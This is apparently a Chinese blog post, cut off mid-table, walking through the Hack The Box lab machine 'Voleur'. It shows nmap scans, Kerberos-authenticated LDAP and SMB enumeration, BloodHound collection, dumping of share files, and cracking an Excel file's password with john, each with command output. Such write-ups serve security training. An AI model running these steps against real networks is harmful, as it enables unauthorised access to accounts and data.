<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/tEwxZSUgfxATz3JXeNydL/_buildManifest.js" defer=""></script><script src="/_next/static/tEwxZSUgfxATz3JXeNydL/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Voleur","contentHtml":"\u003ch1\u003eSeason8 - Voleur\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Voleur\"\u003ehttps://app.hackthebox.com/machines/Voleur\u003c/a\u003e | \u003ccode\u003eWindow\u003c/code\u003e | \u003ccode\u003eMedium\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e**Machine Information ：**As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003e端口 \u0026#x26; 凭据\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nmap -sT -min-rate 5000 -p- 10.10.11.76     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 21:21 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.76\nHost is up (0.048s latency).\nNot shown: 65525 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n593/tcp   open  http-rpc-epmap\n3268/tcp  open  globalcatLDAP\n49668/tcp open  unknown\n57745/tcp open  unknown\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 26.57 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nmap -sT -A -p $(\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003epaste\u003c/span\u003e -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) 10.10.11.76\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 05:00 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.76\nHost is up (0.14s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-07-06 21:00:21Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)\n49668/tcp open  msrpc         Microsoft Windows RPC\n57745/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|11|2016 (90%)\nOS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows 10 - 11 (90%), Microsoft Windows Server 2016 (90%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-06T21:01:35\n|_  start_date: N/A\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   152.79 ms 10.10.16.1\n2   152.85 ms 10.10.11.76\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 124.00 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试凭据，需要指定\u003ccode\u003eKerberos\u003c/code\u003e认证\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nxc ldap 10.10.11.76 -u ryan.naylor -p \u003cspan class=\"hljs-string\"\u003e'HollowOct31Nyt'\u003c/span\u003e -d voleur.htb    \nLDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)\nLDAP        10.10.11.76     389    DC               [-] voleur.htb\\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED\n➜  Voleur nxc ldap 10.10.11.76 -u ryan.naylor -p \u003cspan class=\"hljs-string\"\u003e'HollowOct31Nyt'\u003c/span\u003e -d voleur.htb -k \nLDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)\nLDAP        10.10.11.76     389    DC               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e枚举用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nxc ldap 10.10.11.76 -u ryan.naylor -p \u003cspan class=\"hljs-string\"\u003e'HollowOct31Nyt'\u003c/span\u003e -d voleur.htb -k --\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nLDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)\nLDAP        10.10.11.76     389    DC               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt \nLDAP        10.10.11.76     389    DC               [*] Enumerated 11 domain \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e: voleur.htb\nLDAP        10.10.11.76     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-\nLDAP        10.10.11.76     389    DC               Administrator                 2025-01-29 04:35:13 0        Built-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e administering the computer/domain\nLDAP        10.10.11.76     389    DC               Guest                         \u0026#x3C;never\u003e             0        Built-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e guest access to the computer/domain\nLDAP        10.10.11.76     389    DC               krbtgt                        2025-01-29 16:43:06 0        Key Distribution Center Service Account\nLDAP        10.10.11.76     389    DC               ryan.naylor                   2025-01-29 17:26:46 0        First-Line Support Technician\nLDAP        10.10.11.76     389    DC               marie.bryant                  2025-01-29 17:21:07 2        First-Line Support Technician\nLDAP        10.10.11.76     389    DC               lacey.miller                  2025-01-29 17:20:10 3        Second-Line Support Technician\nLDAP        10.10.11.76     389    DC               svc_ldap                      2025-01-29 17:20:54 0                  \nLDAP        10.10.11.76     389    DC               svc_backup                    2025-01-29 17:20:36 3                  \nLDAP        10.10.11.76     389    DC               svc_iis                       2025-01-29 17:20:45 0                  \nLDAP        10.10.11.76     389    DC               jeremy.combs                  2025-01-29 23:10:32 3        Third-Line Support Technician\nLDAP        10.10.11.76     389    DC               svc_winrm                     2025-01-31 17:10:12 0                  \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eBloodHound\u003c/h3\u003e\n\u003cp\u003e上\u003ccode\u003eBloodhound\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur bloodhound-python -k -d \u003cspan class=\"hljs-string\"\u003e'voleur.htb'\u003c/span\u003e -ns 10.10.11.76 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC.voleur.htb'\u003c/span\u003e -u ryan.naylor -p HollowOct31Nyt \nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: voleur.htb\nINFO: Using TGT from cache\nINFO: Found TGT with correct principal \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e ccache file.\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 12 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 56 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 5 ous\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 03M 01S                   \nINFO: Compressing output into 20250707052145_bloodhound.zip  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e突然发现有三个有趣的组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMATCH (g:Group) WHERE g.name CONTAINS \u003cspan class=\"hljs-string\"\u003e'TECHNICIANS'\u003c/span\u003e RETURN g                                                                                                \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当前我们的用户属于\u003ccode\u003eFIRST-LINE TECHNICIANS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e属于远程组用户有两个，我更倾向于\u003ccode\u003eJEREMY.COMBS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eSMB Recon\u003c/h3\u003e\n\u003cp\u003e但是我们当前用户无法执行任何操作，我们回到\u003ccode\u003eSMB\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 生成 krb5.conf 文件\n➜  Voleur nxc smb DC.voleur.htb -u \u003cspan class=\"hljs-string\"\u003e'ryan.naylor'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'HollowOct31Nyt'\u003c/span\u003e -k --generate-krb5-file krb5.conf\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur getTGT.py voleur.htb/ryan.naylor:\u003cspan class=\"hljs-string\"\u003e'HollowOct31Nyt'\u003c/span\u003e -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e ryan.naylor.ccache\n\n➜  Voleur \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=ryan.naylor.ccache     \n                              \n➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e记得加上 \u003ccode\u003e--smb-timeout 9999\u003c/code\u003e ，否则可能会出现：\u003ccode\u003eThe NETBIOS connection with the remote host timed out.\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache --shares --smb-timeout 9999\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \nSMB         DC.voleur.htb   445    DC               [*] Enumerated shares\nSMB         DC.voleur.htb   445    DC               Share           Permissions     Remark\nSMB         DC.voleur.htb   445    DC               -----           -----------     ------\nSMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin\nSMB         DC.voleur.htb   445    DC               C$                              Default share\nSMB         DC.voleur.htb   445    DC               Finance                         \nSMB         DC.voleur.htb   445    DC               HR                              \nSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC\nSMB         DC.voleur.htb   445    DC               IT              READ            \nSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share \nSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003enxc\u003c/code\u003e运行模块列出所有可读文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache --smb-timeout 9999 -M spider_plus\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Started module spidering_plus with the following options:\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  DOWNLOAD_FLAG: False\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]     STATS_FLAG: True\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] EXCLUDE_FILTER: [\u003cspan class=\"hljs-string\"\u003e'print$'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ipc$'\u003c/span\u003e]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]   EXCLUDE_EXTS: [\u003cspan class=\"hljs-string\"\u003e'ico'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'lnk'\u003c/span\u003e]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         DC.voleur.htb   445    DC               [*] Enumerated shares\nSMB         DC.voleur.htb   445    DC               Share           Permissions     Remark\nSMB         DC.voleur.htb   445    DC               -----           -----------     ------\nSMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin\nSMB         DC.voleur.htb   445    DC               C$                              Default share\nSMB         DC.voleur.htb   445    DC               Finance                         \nSMB         DC.voleur.htb   445    DC               HR                              \nSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC\nSMB         DC.voleur.htb   445    DC               IT              READ            \nSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share \nSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share \nSPIDER_PLUS DC.voleur.htb   445    DC               [+] Saved share-file metadata to \u003cspan class=\"hljs-string\"\u003e\"/root/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json\"\u003c/span\u003e.\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Filtered Shares:  1\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total folders found:  27\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total files found:    7\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size average:    3.55 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size min:        22 B\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size max:        16.5 KB\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e转储所有文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Started module spidering_plus with the following options:\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]     STATS_FLAG: True\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] EXCLUDE_FILTER: [\u003cspan class=\"hljs-string\"\u003e'print$'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'ipc$'\u003c/span\u003e]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]   EXCLUDE_EXTS: [\u003cspan class=\"hljs-string\"\u003e'ico'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'lnk'\u003c/span\u003e]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         DC.voleur.htb   445    DC               [*] Enumerated shares\nSMB         DC.voleur.htb   445    DC               Share           Permissions     Remark\nSMB         DC.voleur.htb   445    DC               -----           -----------     ------\nSMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin\nSMB         DC.voleur.htb   445    DC               C$                              Default share\nSMB         DC.voleur.htb   445    DC               Finance                         \nSMB         DC.voleur.htb   445    DC               HR                              \nSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC\nSMB         DC.voleur.htb   445    DC               IT              READ            \nSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share \nSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share \nSPIDER_PLUS DC.voleur.htb   445    DC               [+] Saved share-file metadata to \u003cspan class=\"hljs-string\"\u003e\"/root/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json\"\u003c/span\u003e.\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Filtered Shares:  1\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total folders found:  27\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total files found:    7\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size average:    3.55 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size min:        22 B\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size max:        16.5 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File unique exts:     5 (pol, ini, xlsx, inf, csv)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Downloads successful: 7\nSPIDER_PLUS DC.voleur.htb   445    DC               [+] All files processed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003exlsx Crack\u003c/h3\u003e\n\u003cp\u003e打开\u003ccode\u003exlsx\u003c/code\u003e文件需要密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur office2john Access_Review.xlsx \u003e xslxPass.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Voleur john --wordlist=/usr/share/wordlists/rockyou.txt xslxPass.txt \nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])\nCost 1 (MS Office version) is 2013 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nCost 2 (iteration count) is 100000 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nfootball1        (Access_Review.xlsx)     \n1g 0:00:00:05 DONE (2025-07-07 06:52) 0.1945g/s 161.8p/s 161.8c/s 161.8C/s football1..legolas\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e内容是：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eUser\u003c/th\u003e\n\u003cth\u003eJob Title\u003c/th\u003e\n\u003cth\u003ePermissions\u003c/th\u003e\n\u003cth\u003eNotes\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eRyan.Naylor\u003c/td\u003e\n\u003ctd\u003eFirst-Line Support Technician\u003c/td\u003e\n\u003ctd\u003eSMB\u003c/td\u003e\n\u003ctd\u003eHas Kerberos Pre-Auth disabled temporarily to test legacy systems.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eMarie.Bryant\u003c/td\u003e\n\u003ctd\u003eFirst-Line Support Technician\u003c/td\u003e\n\u003ctd\u003eSMB\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eLacey.Miller\u003c/td\u003e\n\u003ctd\u003eSecond-Line Support Technician\u003c/td\u003e\n\u003ctd\u003eRemote Management Users\u003c/td\u003e\n\u003ctd\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cdel\u003eTodd.Wolfe\u003c/del\u003e\u003c/td\u003e\n\u003ctd\u003eSecond-Line Support Technician\u003c/td\u003e\n\u003ctd\u003eRemote Management 